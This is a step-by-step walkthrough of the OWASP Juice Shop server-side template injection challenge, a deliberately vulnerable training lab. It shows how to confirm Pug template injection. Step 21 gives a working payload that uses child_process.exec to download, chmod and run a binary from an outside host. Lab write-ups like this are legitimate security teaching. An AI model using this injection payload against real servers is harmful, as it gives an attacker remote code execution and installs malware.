## SSTi
### Challenge: Infect the server with juicy malware by abusing arbitrary command execution.

1. Visit the ftp folder of the web application at http://\<host\>:3000/ftp
2. Click on the quarantine folder.
3. Inside the quarantine folder, download the url file for your system architecture.
4. Use a decompiler to analyze the url file.
5. Run a string search to find the URL for `juicy malware` at https://github.com/J12934/juicy-malware
6. Visit the `juicy malware` github repository.
7. Download the malware variant for your system architecture.
8. Run the malware to observe it is making a call to an endpoint at localhost:3000.
9. Use a decompiler to analyze the malware.
10. Run a string search to find the full URL of its destined endpoint as http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
11. Log in as any user in the web application.
12. Open the Network tab of the Browser Inspector.
13. Visit the profile page.
14. Verify the web application is making a web request for the profile page with a 304 Not Modified response code and a response payload of a fresh HTML document.
    - This indicates that the profile page is not an Angular page.
15. Inside the source code for OWASP Juice Shop, verify the file extension of the profile page in the views directory is `pug`.
16. Visit the website for Pugjs at https://pugjs.org/api/getting-started.html to read about the Pugjs templating engine.
17. Verify a template injection into Pugjs in the username field with `#{1+1}`. This will display `2` as the username.
18. Verify the server is making external requests for image files by submitting an image URL in the `Image URL` field.
    - e.g. https://placecats.com/100/100 as the `Image URL` will display a profile image of a cat with no outgoing requests from the browser (the request was made by the server).
19. Paste the destined endpoint for `juicy malware` as the `Image URL`, replacing the host with IP address of the web application.
20. Click the `Link Image` button.
21. Execute the `juicy-malware` payload via Pugjs template injection with the JavaScript `global.process` object.
    - `#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}`
22. Return to the homepage to solve this challenge.
